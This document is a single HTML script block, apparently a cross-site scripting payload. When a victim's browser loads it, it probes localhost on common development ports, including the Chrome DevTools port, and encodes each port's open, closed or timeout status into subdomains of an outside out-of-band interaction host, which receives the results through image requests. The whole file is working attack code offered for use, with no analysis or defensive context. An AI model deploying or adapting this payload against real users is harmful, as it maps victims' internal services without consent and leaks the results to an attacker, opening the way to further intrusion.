<script>
  // Your unique Burp Collaborator / Interactsh domain
  const exfilDomain = 'yxvymqbmkxaoqosfwvmagz6pidd6jubij.oast.fun';

  // --- TARGET LIST ---
  // We will scan localhost on these common development/proxy ports
  const targets = [
    { host: '127.0.0.1', port: 80 },
    { host: '127.0.0.1', port: 443 },
    { host: '127.0.0.1', port: 3000 }, // Common for Node.js
    { host: '127.0.0.1', port: 5000 }, // Common for Python/Flask
    { host: '127.0.0.1', port: 8000 },
    { host: '127.0.0.1', port: 8080 },
    { host: '127.0.0.1', port: 9000 }, // Common for dev servers
    { host: '127.0.0.1', port: 9222 }  // Chrome DevTools Protocol
  ];

  // --- EXFILTRATION FUNCTION ---
  function exfiltrate(data) {
    const encodedData = btoa(data).replace(/=/g, ''); // Base64, remove padding
    new Image().src = `http://${encodedData}.${exfilDomain}`;
  }

  // --- SCANNING LOGIC ---
  targets.forEach(target => {
    const url = `http://${target.host}:${target.port}`;
    
    // We use a timeout to differentiate between closed and filtered ports
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2 second timeout

    fetch(url, { signal: controller.signal })
      .then(response => {
        // ANY response means the port is OPEN
        clearTimeout(timeoutId);
        exfiltrate(`${target.host}:${target.port}:OPEN`);
      })
      .catch(error => {
        // Differentiate between timeout and other errors
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') {
            exfiltrate(`${target.host}:${target.port}:TIMEOUT`); // Potentially filtered
        } else {
            exfiltrate(`${target.host}:${target.port}:CLOSED`); // Likely connection refused
        }
      });
  });
</script>
